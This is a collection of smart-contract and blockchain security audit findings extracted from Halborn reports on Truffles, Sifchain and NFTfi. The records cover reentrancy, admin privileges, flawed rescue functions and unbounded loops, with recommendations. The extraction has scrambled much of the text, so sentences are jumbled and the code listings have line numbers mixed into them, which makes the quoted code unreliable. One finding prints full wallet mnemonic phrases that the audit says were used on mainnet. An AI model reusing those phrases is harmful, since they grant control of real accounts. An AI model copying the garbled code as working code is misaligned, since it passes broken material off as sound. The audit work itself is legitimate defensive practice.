paid. Code Location: Listing 5: contracts/Truffles.sol address to , uint256 tokenId , string memory uri 128 function mintPrivateInvoice ( 129 130 131 132 ) public onlyAuthorized { 133 134 135 136 } _safeMint ( to , tokenId ); _setTokenURI ( tokenId , uri ); s_nftType [ tokenId ] = NftType . PrivateInvoice ; Listing 6: contracts/Truffles.sol (Lines 142,143) 141 function settlePrivateInvoice ( uint256 _nftID ) public  onlyAuthorized { 142 143 require ( _exists ( _nftID ) , \" NFT not minted \" ); s_isPrivateInvoicePaid [ _nftID ] = true ; 23 144 145 } BVSS: AO:S/AC:L/AX:L/C:N/I:H/A:L/D:N/Y:M/R:N/S:U (1.9) Recommendation: It is recommended to include a check in the settlePrivateInvoice function to verify that the invoice being settled corresponds to the private NFT type. This additional check ensures that only invoices related to private NFTs can be settled within the function. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: A validation step was introduced to ensure that the provided NFT ID is that of a private invoice before modifying the s_isPrivateInvoicePaid mapping. 24 ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Informational"]}, {"title": "LACK OF REENTRANCYGUARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "the Truffles In and mintPrivateInvoice play a crucial role in minting public and private invoices as non-fungible tokens (NFTs). mintPublicInvoice contract, functions the To achieve this, these functions make use of the _safemint function from the ERC721 contract. This function is responsible for verifying whether the designated recipient can indeed receive ERC721 tokens. By performing this check, it ensures that an NFT is not minted to a contract incapable of handling ERC721 tokens, safeguarding the integrity of the token ecosystem. However, a potential security loophole arises due to an external function call within these functions. When the to parameter refers to a smart contract, it must implement IERC721Receiver.onERC721Received, which is invoked during a safe transfer of the NFT. This external function call creates an opportunity for reentrancy attacks. of the absence reentrancy Specifically, the a mintPublicInvoice and mintPrivateInvoice functions allows an attacker to exploit the onERC721Received callback by performing reentrant calls. This vulnerability enables the attacker to execute multiple, unintended operations during the callback, leading to unexpected and potentially harmful outcomes. guard both in In this context, the possibility of a reentry attack is considered to be unlikely, since only authorized users and the administrator have the privilege to call the mintPublicInvoice and mintPrivateInvoice functions for token minting. Furthermore, as there are no limits on the number of invoices that can be created, and no balance transfers are involved, the potential impact of any such attack would be minimal. 25 Nevertheless, it is crucial to exercise caution, as even minor changes to the code could inadvertently introduce significant security vulnera- bilities Code Location: Listing 7: contracts/Truffles.sol (Line 133) address to , uint256 tokenId , string memory uri 128 function mintPrivateInvoice ( 129 130 131 132 ) public onlyAuthorized { 133 134 135 136 } _safeMint ( to , tokenId ); _setTokenURI ( tokenId , uri ); s_nftType [ tokenId ] = NftType . PrivateInvoice ; Listing 8: contracts/Truffles.sol (Line 179) address _to , uint256 _tokenId , string memory _uri , uint256 _invoiceAmount , string calldata _currency , string calldata _invoiceID , bytes32 _merkleProofTransaction 160 function mintPublicInvoice ( 161 162 163 164 165 166 167 168 ) public onlyAuthorized { 169 170 171 172 173 174 175 176 177 178 179 invoiceData memory iData = invoiceData ({ Amount : _invoiceAmount , nftID : _tokenId , merkleProofTransaction : _merkleProofTransaction , currency : _currency , invoiceID : _invoiceID }) ; s_invoiceDetails [ _tokenId ] = iData ; s_invoice_ID_to_Nft_ID [ _invoiceID ] = _tokenId ; s_nftType [ _tokenId ] = NftType . PublicInvoice ; _safeMint ( _to , _tokenId ); 26 BVSS: AO:S/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:M/R:N/S:U (1.2) Recommendation: To address this security concern to contract be resilient against reen- trancy attacks providing a robust and secure NFT minting process, it is crucial to fortify both the mintPublicInvoice and mintPrivateInvoice functions with two effective measures:  add a reentrancy guard  the adoption of the check-effects pattern. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the reentrancy guard was added to mintPrivateInvoice and mintPublicInvoice functions to mitigate the risk of reentrancy attacks. 27 ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Informational"]}, {"title": "REDUNDANT CHECK IN THE REMOVEAUTHORIZED FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the Authorizable contract, the addAuthorized function allows the owner to add an address to the list of authorized addresses. It requires that the provided address is not the zero address, and it can only be executed by the contract owner because of the onlyOwner modifier. The removeAuthorized function allows the owner to remove an address from the list of authorized addresses. It requires that the provided address is not the zero address and is different from the senders, which has to be the owner. The checks performed in the latter function are redundant, since the addAuthorized function already prevents adding the zero address as an authorized address. Therefore, this check is unnecessary and result in extra gas overhead. Code Location: Listing 9: contracts/Authorizable.sol (Line 25) 24 function addAuthorized ( address _toAdd ) onlyOwner public { 25 26 27 } require ( _toAdd != address (0) ) ; authorized [ _toAdd ] = true ; Listing 10: contracts/Authorizable.sol (Lines 27,28) 26 function removeAuthorized ( address _toRemove ) onlyOwner public { 27 28 29 30 } require ( _toRemove != address (0) ) ; require ( _toRemove != msg . sender ); authorized [ _toRemove ] = false ; 28 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider removing the unnecessary check from the removeAuthorized func- tion. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the redundant check was removed from the removeAuthorized function. 29 ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Informational"]}, {"title": "CONTRACT PAUSE FEATURE MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "It was identified that the Owner cannot pause the Truffles contract. In the case of a security incident, this means that the owner lacks the ability to halt the minting or settlement of Invoices, potentially leading to further complications. Code Location:  contracts/Truffles.sol BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding the pause functionality to the contract. Remediation Plan: SOLVED: The Truffles team solved this finding in commit 2e2a367: The contract now incorporates a pausing mechanism, which introduces two ad- ditional functions: pauseContract and unpauseContract. This enhancement is complemented by the inclusion of the whenNotPaused modifier within several functions, including mintPrivateInvoice, settlePrivateInvoice, mintPublicInvoice, and _beforeTokenTransfer. 30 ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The Truffles contract uses the Solidity pragma 0.8.9. Its essential to deploy the contract with the exact compiler version and flags that have undergone thorough testing. Locking the pragma to a specific version helps to ensure that contracts are not accidentally deployed using outdated compiler versions, which might introduce bugs negatively impacting the contract system, or excessively new pragma versions that havent undergone extensive testing. Code Location: Listing 11: contracts/Truffles.sol (Line 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.9; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. Specifying a fixed compiler version ensures that the deployment. This is especially bytecode produced does not vary between builds. important if you rely on bytecode-level verification of the code. 31 Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the pragma version has been locked and upgraded to match the version used in the Authorizable contract. Listing 12: contracts/Truffles.sol (Line 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.17; 32 MANUAL TESTING 33 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 5.1 ACCESS CONTROL ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Informational"]}, {"title": "PRIVILEGED ACCOUNT CAN ACCESS PEGGED FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The primary function of Sifchain is to offer a cross-chain decentralized exchange. This is achieved by using a decentralized group of oracles that have special privileges. The Peggy design document states that the oracles should use a consensus model. And is used for cross-chain swaps on both the Ethereum and Sif networks, however a single Admin account is capable of withdrawing tokens via the RescueCeth functionality. This is without consensus or governance, and is entirely unilateral. The risk is compounded by additional findings outlined in this report. Code Location: IsAdminAccount is the function used to authenticate the Admin. Listing 1: x/oracle/keeper/adminAccount.go 18 func ( k Keeper ) IsAdminAccount ( ctx sdk . Context , adminAccount sdk . AccAddress ) bool { account := k. GetAdminAccount ( ctx ) if account == nil { return false } return bytes . Equal ( account , adminAccount ) 19 20 21 22 23 24 } This is used as the only authority check in the ProcessRescueCeth and ProcessUpdateCethReceiverAccount function, if the following test passes, all ceth (aka wrapped ethereum assets on Sifchain) can be withdrawn to an arbitrary Sifchain account. Listing 2: x/oracle/keeper/keeper.go 215 216 if ! k . oracleKeeper . IsAdminAccount ( ctx , cosmosSender ) { logger . Error (\" cosmos sender is not admin account . \") 15 217 218 return errors . New ( \" only admin account can call rescue ceth \" ) } Risk Level: Likelihood - 3 Impact - 3 Recommendations: Short Term:  Setup monitoring for activity on the Admin account, any activity should immediately trigger a response.  Prepare a break-glass procedure for the case where this account is compromised. What needs to be done on both chains, who will do it, how to communicate the issue, community interaction. All incident response tasks need to be pre-planned. Assume that it will happen, and design the response to minimize the damage. This procedure will likely involve pausing contracts and halting the oracle nodes to prevent ongoing damage. Long Term:  Eliminate the Admin account.  Remove any privileged account functions and move these abilities as a function of governance or delegate the functionality to a super majority vote of either oracles or validators. Remediation Plan: ACKNOWLEDGED: and claims ProcessUpdateCethRecieverAccount do not have access to all the pegged ProcessRescueCeth Sifchain Team that 16 They can only access cETH paid by users funds deposited by users. as fees to export their assets to Ethereum. ProcessRescueCeth1 and ProcessUpdateCethRecieverAccount do NOT have access to all the pegged They can only access cETH paid by users funds deposited by users. as fees to export their assets to Ethereum. When users export assets from Sifchain to Ethereum, they pay cETH to a Receiver Account that The relayers are on both Ethereum and represents the Relayers. Sifchain, only they can accept cETH on Ethereum and pay a corresponding amount of ETH on Ethereum on behalf of the user to send them their and exported ProcessUpdateCethRecieverAccount is to occasionally gather all the cETH paid by users as fees, have the admin export it to Ethereum, and then give it to the Relayer so it can pay additional fees. ProcessRescueCeth Ethereum assets. purpose The of 17 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Medium"]}, {"title": "ADMIN ACCOUNT IS HARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The Admin account is defined at genesis and there does not seem to be a mechanism to update the account. If the key is compromised it would be impossible to contain the attack without stopping the chain and deploying new code. This further amplifies the risk of HAL-01 because there is no containment mechanism in the case of a compromised key, and the only resulting possible solution is to halt all oracles and pause contracts to prevent fund transfers, assuming the funds have not already been moved. Code Location: Figure 1: Only reference to SetAdminAccount 18 The account being allocated can be seen in the genesis.json file: Listing 3: .sifnoded/config/genesis.json 193 194 195 196 \" oracle \" : { \" address_whitelist \" : null , \" admin_address \": \" sif1wy22rv4w3l9vmw5cvdc6npg8t0vess0kpvga3j \" }, Risk Level: Likelihood - 2 Impact - 2 Recommendations: Eliminate the Admin role and use governance. Remediation Plan: ACCEPTED RISK: The risk has been taken by the Sifchain Team. There are methods to upgrade the Genesis with a Network Upgrade. 19 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Low"]}, {"title": "ONLY ADMINS CAN ASSIGN ORACLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "ONLY ADMINS CAN ASSIGN ORACLES", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Medium"]}, {"title": "NETWORK CENTRALIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Sifchain has stated that decentralization is an eventual goal, with a promise of transitioning to a DAO with full on-chain governance However, the chain has millions of dollars of assets post-Betanet. pegged right now. The network validator, oracle, and admin roles are almost entirely controlled by Sifchain. Eighty-six percent of the networks validator stake is controlled by Sifchain and assigned to nodes run by Sifchain. This not only gives the appearance of a centralized system, it also disincentives smaller validators from running nodes further contributing to the problem. It also appears that this centralization has been downplayed by modifying the BigDipper-based Sifchain block explorer to show a set of random validators where recently signed blocks would normally appear, giving the illusion of a more decentralized validator set. 21 Figure 2: Cosmos Big Dipper Shows Recent Blocks 22 Figure 3: Sifchain shows random validators instead 23 Risk Level: Likelihood - 2 Impact - 2 Recommendations: Despite running on a public blockchain and inviting validators to participate, validators and token holders have little power. The last governance proposals were immediately and solely approved by Sifchain-owned accounts.  Sifchain should reduce the amount of rowan staked to their validators. This could be done by transitioning to an incentive model, such as the Kusama Thousand Validator program, or even the Osmosis foundations delegation program, where funds are allocated to validators that fulfill certain requirements for uptime, governance participation or telemetry statistics.  There should be a minimum stake required for validators that is high enough to ensure quality validators are securing the network.  The size of the validator pool should be reduced if there are not sufficient validators to create competition for joining the active set. Remediation Plan: PARTIALLY FIXED: Sifchain retired the old block explorer entirely in favor of this 3rd party block explorer run by Cosmostation https://www.mintscan.io/sifchain. Sifchains foundation validators cannot earn any validator income as its all redistributed to the other validators, so the disincentivization issue is not an issue. That said, we agree the networks security comes from the foundations validators. Sifchain is considering a foundation delegation program with the following constraints: 24 1. Known validator that can sign a contract 2. Minimum self-delegation of some number of Rowan (not sure the amount yet) 3. Minimum 2% commission, maximum 10% commission 4. Not being slashed for not updating to a new node. 5. Bonus points based on content in Persistences program 25 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Low"]}, {"title": "ORACLES SIGN WITH VALIDATOR KEYS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The Oracle role is required to be a validator. While this may seem like a way to further restrict permissions it does not provide any additional protection. Sifchain only has seventy two active producers and the lowest self-bond is 1rowan which at the time of this report is $0.12 USD. Using the same key on both a Validator and Oracle increases the risk of the Oracle key being disclosed, especially if they are run on separate nodes. This also violates the principle of least privilege, and given the power Oracles wield reducing exposure should be a priority. Code Location: The following check enforces this behavior: Listing 5: x/staking/keeper/validator.go 26 func ( k Keeper ) mustGetValidator ( ctx sdk . Context , addr sdk . ValAddress ) types . Validator { validator , found := k . GetValidator ( ctx , addr ) if ! found { panic ( fmt . Sprintf ( \" validator record not found for address : % X\\ n \" , addr )) } return validator 27 28 29 30 31 32 33 } Risk Level: Likelihood - 2 Impact - 3 26 Recommendations: Authorization for oracle or bridge related actions and validators should use different roles. Remediation Plan: PENDING: Sifchain Team will fix it in a future release. 27 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Low"]}, {"title": "SENSITIVE INFORMATION IN ENVIRONMENT VARIABLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "When you store your secret keys in an environment variable, you are prone to accidentally exposing them. Code Location: Signature Go File Listing 6: cmd/ebrelayer/txs/signature.go 21 func LoadPrivateKey () ( key * ecdsa . PrivateKey , err error ) { 22 // Private key for validator 's Ethereum address must be set as an environment variable 23 24 rawPrivateKey := os . Getenv ( \" ETHEREUM_PRIVATE_KEY \" ) .... Risk Level: Likelihood - 3 Impact - 3 Recommendations: Given that the environment is implicitly available to the process, its hard, if not impossible, to track access and how the contents get exposed (ps -eww ). Its common to have applications grab the whole environment and print it out for debugging or error reporting. Environment variables are passed down to child processes, which allows for unintended access. Imagine that as part This breaks the principle of least privilege. of your application, you call to a third-party tool to perform some action---all of a sudden that third-party tool has access to your 28 When applications crash, its common for them to store environment. the environment variables in log-files for later debugging. This means plain-text secrets on disk. Remediation Plan: PENDING: Sifchain Team will fix it in a future release with a refactor of using options such as a Key Manager external to the environment such as HSM or Secrets Manager. They need to use an HSM to generate keys and AWS Secrets Manager to retrieve to address 06 29 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Medium"]}, {"title": "HARDCODED MNEMONIC PHRASES IN THE REPOSITORY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the SifNode repository, it was discovered that there are multiple mnemonic phrases hardcoded in bash scripts. At least one of the keys have been in active use on both the Sifchain and Ethereum mainnets, in particular the sif account referenced below.  Sifchain Transactions  Ethereum Transactions Code Location: init.sh Listing 7: /scripts/init.sh (Lines ) 1 echo \" Generating deterministic account - sif \" 2 echo \" race draft rival universe maid cheese steel logic crowd fork comic easy truth drift tomorrow eye buddy head time cash swing swift midnight borrow \" | sifnodecli keys add sif -- recover 3 4 echo \" Generating deterministic account - akasha \" 5 echo \" hand inmate canvas head lunar naive increase recycle dog ecology inhale december wide bubble hockey dice worth gravity ketchup feed balance parent secret orchard \" | sifnodecli keys add akasha -- recover 6 sifchain_start_daemon.sh Listing 8: sifchain start daemon.sh (Lines ) 1 #{ \" name \" : \" fnord \" ,\" type \" :\" local \" ,\" address \": \" sif10ckfjtdmk9zkcs9fhl0h260xsj6kvg7esmyqrw \" ,\" pubkey \" :\" \" ,\" 30 mnemonic \" : \" exact below syrup slender party witness already lamp inform dash impose ginger sauce shift tag humble awkward spawn blue flower lab census gold girl \" } 2 Risk Level: Likelihood - 2 Impact - 3 Recommendations: Use secure vault to store credentials instead of using them hardcoded. It is recommended to delete mnemonic phrases from the Git Also, history, and change any previously used mnemonic phrases to prevent future incidents if these mnemonic phrases have been leaked, or reused elsewhere. Test scripts should dynamically create keys at runtime. Remediation Plan: ACCEPTED RISK: Sifchain Team claims that the mnemonic phrases used only for test purpose. 31 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Low"]}, {"title": "UNBOUNDED LOOPS ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "peggyTokens and distributionRecordsclass contain an iteration which does not have bound on the itself. If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.The program contains an iteration or loop with an exit condition that cannot be reached. Code Location: peggyTokens.go Listing 9: x/ethbridge/keeper/peggyTokens.go (Lines ) 23 .... 24 25 26 27 28 29 30 31 ... tokens := k . GetPeggyToken ( ctx ) for _ , value := range tokens { if value == token { return true } } return false distributionRecords.go Listing 10: https://github.com/Sifchain/sifnode/blob/d1ecf5449b7ffae9ae279fb1246844d6925d970a/x/dispensation/keeper/distributionRecords.go (Lines ) 214 func ( k Keeper ) GetRecords ( ctx sdk . Context ) types . DistributionRecords { var res types . DistributionRecords iterator := k . GetDistributionRecordsIterator ( ctx ) defer iterator . Close () for ; iterator . Valid () ; iterator . Next () { var dr types . DistributionRecord 215 216 217 218 219 32 220 221 222 223 224 225 } bytesValue := iterator . Value () k . cdc . MustUnmarshalBinaryBare ( bytesValue , & dr ) res = append ( res , dr ) } return res Risk Level: Likelihood - 1 Impact - 1 Recommendations: Consider implementing bounds on the functions. Remediation Plan: PENDING: Sifchain Team will fix it in a future release. 33 ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Informational"]}, {"title": "RUN CONTAINER AS ROOT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Configuring the container to use an unprivileged user is the best way to prevent privilege escalation attacks. It is possible to run sifnode as a root via Docker. Sample Docker Image: Location: b9628ea5eebf41fd2ef7c7533f4022be2/deploy/docker/mainnet/docker- compose.yml#L6 https://github.com/Sifchain/sifnode/blob/9597894 Listing 11 1 FROM sifchain / sifnoded : mainnet - genesis 2 RUN addgroup -g 26656 sif && adduser -u 26656 -G sif -S -h / app sif && \\ 3 4 5 mkdir -p / app /. sifnoded / cosmovisor / genesis / bin / app /. sifnoded / cosmovisor / upgrades \\ / app /. sifnoded / config / app /. sifnoded / data && \\ mv / usr / bin / sifnoded / app /. sifnoded / cosmovisor / genesis / bin / && chown -R sif : sif / app 6 USER sif 7 WORKDIR / app 8 ENV PATH / usr / local / sbin :/ usr / local / bin :/ usr / sbin :/ usr / bin :/ sbin :/ bin :/ app /. sifnoded / cosmovisor / genesis / bin 9 Risk Level: Likelihood - 3 Impact - 2 34 Recommendations: One of the best practices while running Docker Container is to run processes with a non-root user. This is because if a user manages to break out of the application running as root in the container, an attacker may gain root user access on host. Remediation Plan: PENDING: Sifchain Team will fix it in a future release. 35 3.10 (HAL-10) UNSAFE RPC EXPOSED - INFORMATIONAL ", "labels": ["Halborn", "Sifchain_Sifnode_042_Upgrade", "Severity: Informational"]}, {"title": "BUNDLES INSIDE IMMUTABLEBUNDLES CONTRACT CAN BE EXTRACTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "can lock their bundles Users or PersonalBundler contracts) by transferring them to the ImmutableBundle contract with the safeTransferFrom() function. This prevents users from extracting NFTs from the bundle right before taking a loan on them. NftfiBundler (created with the ImmutableBundle implements the rescueERC721() and rescueERC20() func- tions, which allow the owner account to retrieve ERC20 and ERC721 to- To prevent kens received in airdrops for the locked collateral NFTs. rescueERC721() function from extracting bundle tokens, a require state- ment checks the _tokenAddress value not to match the NftfiBundler or PersonalBundler contract addresses. However, it has been detected that, instead of _tokenAddress, msg.sender is checked to be a PersonalBundler token, which it cannot be, since this function can only be called by the owner of ImmutableBundle contract. This makes all PersonalBundler tokens extractable from the contract, incurring a loss of the bundled NFTs to the user. Code Location: Listing 1: ImmutableBundle.sol 276 277 /* * * @notice used by the owner account to be able to drain  ERC721 tokens received as airdrops 278 279 * for the locked * @param _tokenAddress - address of the token contract for collateral NFT -s  the token to be sent out 280 281 282 * @param _tokenId - id token to be sent out * @param _receiver - receiver of the token */ 16 283 284 285 286 287 288 289 290 291 function rescueERC721 ( address _tokenAddress , uint256 _tokenId , address _receiver ) external onlyOwner { IERC721 tokenContract = IERC721 ( _tokenAddress ); require ( _tokenAddress != address ( bundler ) && ! PersonalBundlerFactory ( personalBundlerFactory ).  personalBundlerExists ( msg . sender ) , 292 293 294 \" token is a bundle \" ); require ( tokenContract . ownerOf ( _tokenId ) == address ( this ) ,  \" nft not owned \" ); 295 tokenContract . safeTransferFrom ( address ( this ) , _receiver ,  _tokenId ); } 296 17 Proof of Concept: This PoC shows how User2 bundles NFTs 1, 2, and 3 with an instance of PersonalBundler, sends it to ImmutableBundle and then it gets successfully extracted with the rescueERC721() function: Risk Level: Likelihood - 2 Impact - 4 Recommendation: The rescueERC721() function should validate the _tokenAddress parameter instead of msg.sender to prevent personal bundles to be extracted. 18 Remediation Plan: instead of msg.sender. SOLVED: The NFTfi team solved the issue by validating _tokenAddress In addition, immutableOfBundle[_tokenId] or immutableOfPersonalBundler[_tokenAddress] are required to be 0, mean- ing that NftfiBundler or PersonalBundler tokens not associated to any immutable bundle can also be extracted, remediating HAL-02 issue. Commit ID: 52f68e41a729e83f27c1cb747a464a2367132d5b 19 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Medium"]}, {"title": "MISTAKENLY SENT BUNDLE TOKENS CAN NOT BE RESCUED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "can lock their bundles (created or Users PersonalBundler contracts) by transferring them to the ImmutableBundle contract with the safeTransferFrom() function. However, these contracts rely on users sending tokens to them with the appropriate functions (e.g., safeTransferFrom or getChild instead of transfer and transferFrom) to properly record those transactions. NftfiBundler with the The ImmutableBundle contract allows the admin to recover ERC721 tokens with the rescueERC721 function. However, this function does not allow rescuing NftfiBundler or PersonalBundler tokens; therefore, it is im- possible to recover bundles that were accidentally transferred with the wrong transfer functions (e.g., transfer or transferFrom). Code Location: Listing 2: ImmutableBundle.sol 276 277 /* * * @notice used by the owner account to be able to drain  ERC721 tokens received as airdrops 278 279 * for the locked * @param _tokenAddress - address of the token contract for collateral NFT -s  the token to be sent out 280 281 282 283 284 285 286 287 288 289 290 * @param _tokenId - id token to be sent out * @param _receiver - receiver of the token */ function rescueERC721 ( address _tokenAddress , uint256 _tokenId , address _receiver ) external onlyOwner { IERC721 tokenContract = IERC721 ( _tokenAddress ); require ( _tokenAddress != address ( bundler ) && 20 291 ! PersonalBundlerFactory ( personalBundlerFactory ).  personalBundlerExists ( msg . sender ) , 292 293 294 \" token is a bundle \" ); require ( tokenContract . ownerOf ( _tokenId ) == address ( this ) ,  \" nft not owned \" ); 295 tokenContract . safeTransferFrom ( address ( this ) , _receiver ,  _tokenId ); } 296 Proof of Concept: As a proof of concept, user2 bundles NFTs 1, 2, and 3 with NftfiBundler and transfers them to the ImmutableBundle contract with the transferFrom() function, which locks the bundle (and the NFTs contained in it) forever: 21 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to modify the rescueERC721() function to also allow rescuing bundle tokens if they are not associated to any immutable bundle, meaning that they were transferred to the ImmutableBundle contract using the wrong methods. Remediation Plan: SOLVED: The NFTfi team solved the issue by requiring immutableOfBundle [_tokenId] or immutableOfPersonalBundler[_tokenAddress] to be 0, which means that NftfiBundler or PersonalBundler tokens not associated with no immutable bundle can be extracted. Commit ID: 52f68e41a729e83f27c1cb747a464a2367132d5b 22 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Medium"]}, {"title": "POSSIBLE LOSS OF OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When transferring the ownership of the protocol, no checks are performed on whether the new address is valid and active. In case there is a mistake when transferring the ownership, the whole protocol may lose all of its ownership functionalities. Code Location: Listing 3: Ownable.sol * @dev Transfers ownership of the contract to a new account * Can only be called by the current owner . */ function transferOwnership ( address _newOwner ) public virtual require ( _newOwner != address (0) , \" Ownable : new owner is /* * 42 43  ( ` newOwner `) . 44 45 46  onlyOwner { 47  the zero address \" ); 48 49 } _setOwner ( _newOwner ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: The transfer of ownership process should be split into two different transactions, the first one calling the requestTransferOwnership function which proposes a new owner for the protocol, and the second one, the new 23 owner accepts the proposal by calling acceptsTransferOwnership function. Remediation Plan: SOLVED: The NFTfi team solved the issue by implementing a two-step own- ership transfer process. Commit ID: 52f68e41a729e83f27c1cb747a464a2367132d5b 24 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Medium"]}, {"title": "SENDELEMENTSTOPERSONALBUNDLER(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Users can call sendElementsToPersonalBundler() function to move every token inside a bundle to a personal bundle. This function uses a while loop to iterate through every childToken of every childContract until childContracts[_tokenId] and childTokens[_tokenId][childContrac] lengths are 0, meaning that no more child tokens are held in the bundle. However, if tokens are already in a personal bundle, and they are trans- ferred to the same bundle, or if they are in a NftfiBundler bundle with id = 1 and theyre being transferred to the same NftfiBundler bundle (the second scenario is less likely than the first one), the function runs into an infinite loop, since the lengths mentioned above will never decrease, keeping the while loop running until it spends the max amount of gas allowed for the call, reverting the state and incurring unnecessary cost to the user. Code Location: Listing 4: NftfiBundler.sol 130 131 /* * * @notice Remove all the children from the bundle and send to  personla bundler . 132 * If bundle contains a legacy ERC721 element , this will not  work . 133 * @dev This method may run out of gas if the list of children  is too big . In that case , children can be removed 134 135 136 individually . * * @param _tokenId the id of the bundle * @param _personalBundler address of the receiver of the 25  children 137 138 */ function sendElementsToPersonalBundler ( uint256 _tokenId ,  address _personalBundler ) external { 139 140 141 142 143 144 _validateReceiver ( _personalBundler ); _validateTransferSender ( _tokenId ); // fix this actual personalBundlerExists require ( IERC165 ( _personalBundler ). supportsInterface ( type (  IERC998ERC721TopDown ). interfaceId ) , 145 146 147 148 149 \" has to implement IERC998ERC721TopDown \" ); uint256 personalBundleId = 1; // make sure sendeer owns personal bundler token require ( IERC721 ( _personalBundler ). ownerOf ( personalBundleId  ) == msg . sender , \" has to own personal bundle token \" ); 150 151 // In each iteration all contracts children are removed ,  so eventually all contracts are removed 152 153  ; 154 155 while ( childContracts [ _tokenId ]. length () > 0) { address childContract = childContracts [ _tokenId ]. at (0) // In each iteration a child is removed , so eventually  all contracts children are removed 156  0) { 157 while ( childTokens [ _tokenId ][ childContract ]. length () > uint256 childId = childTokens [ _tokenId ][  childContract ]. at (0) ; 158 159 160 161 162 163 164 165 166 167 168 169 _removeChild ( _tokenId , childContract , childId ); try IERC721 ( childContract ). safeTransferFrom ( address ( this ) , _personalBundler , childId , abi . encodePacked ( personalBundleId ) ) { // solhint - disable - previous - line no - empty -  blocks 170 } catch { 26 171 172 173 revert (\" only safe transfer \"); } emit TransferChild ( _tokenId , _personalBundler ,  childContract , childId ); 174 175 176 } } } Proof of 